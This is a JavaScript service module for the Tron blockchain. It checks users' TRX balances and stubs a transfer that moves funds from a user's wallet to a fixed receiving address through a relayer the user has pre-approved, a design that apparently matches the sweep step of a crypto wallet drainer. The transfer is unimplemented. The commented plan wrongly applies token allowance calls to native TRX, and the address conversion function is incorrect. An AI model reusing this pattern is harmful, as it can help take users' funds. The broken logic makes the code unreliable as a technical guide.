import axios from 'axios'
import { CONFIG } from '../config.js'

/**
 * Tron Blockchain Service
 * Handles balance detection and TRX transfers
 */

class TronService {
  constructor() {
    this.apiUrl = 'https://api.trongrid.io'
    this.relayerAddress = CONFIG.relayerTron.address
    this.relayerPrivateKey = CONFIG.relayerTron.privateKey
  }

  /**
   * Get TRX balance
   */
  async getBalance(address) {
    try {
      const response = await axios.post(
        `${this.apiUrl}/wallet/getaccount`,
        { address },
        { headers: { 'Content-Type': 'application/json' } }
      )

      if (response.data.balance) {
        return (response.data.balance / 1000000).toString() // Convert sun to TRX
      }
      return '0'
    } catch (error) {
      console.error('Error getting Tron balance:', error.message)
      return '0'
    }
  }

  /**
   * Detect Tron balance
   */
  async detectBalance(account) {
    try {
      const balance = await this.getBalance(account)
      console.log('✅ Tron balance detected:', balance)
      return { tron: balance }
    } catch (error) {
      console.error('Error detecting Tron balance:', error)
      return { tron: '0' }
    }
  }

  /**
   * Transfer TRX from user wallet to receiver
   * Requires user to pre-sign transaction or authorize relayer with private key
   * User must approve relayer as spender beforehand
   */
  async transferTRX(userAddress, amount) {
    try {
      const receiverAddress = CONFIG.receivingAddresses.tron
      const relayerAddress = this.relayerAddress

      console.warn(`⚠️ TRX transfer from user account requires TronWeb integration with pre-authorization`)
      console.log(`📋 Required: User must pre-authorize relayer to spend TRX`)
      console.log(`   From: ${userAddress}`)
      console.log(`   To: ${receiverAddress}`)
      console.log(`   Amount: ${amount} TRX`)
      console.log(`   Relayer (fee payer): ${relayerAddress}`)

      // Real implementation would use TronWeb:
      // const tronweb = new TronWeb({
      //   fullHost: 'https://api.trongrid.io'
      // })
      // 1. Check if user has approved relayer:
      // const allowance = await tronweb.contract().at(tokenAddress).allowance(userAddress, relayerAddress).call()
      // 2. If approved, call transferFrom:
      // const tx = await tronweb.contract().at(tokenAddress).transferFrom(
      //   userAddress,
      //   receiverAddress,
      //   amount
      // ).send({from: relayerAddress})

      return {
        hash: null,
        amount: amount.toString(),
        chain: 'tron',
        from: userAddress,
        to: receiverAddress,
        relayerPaysFee: relayerAddress,
        error: 'TRON transfers require TronWeb library integration with pre-authorization. User must approve relayer first.'
      }
    } catch (error) {
      console.error('Error preparing TRX transfer:', error.message)
      return {
        hash: null,
        amount: amount.toString(),
        chain: 'tron',
        error: error.message
      }
    }
  }

  /**
   * Convert Tron address format
   */
  convertAddress(address) {
    // Tron address conversion (base58 to hex)
    // This is simplified - real implementation would use TronWeb
    return address.startsWith('T') ? address : '41' + address.slice(2)
  }
}

export const tronService = new TronService()
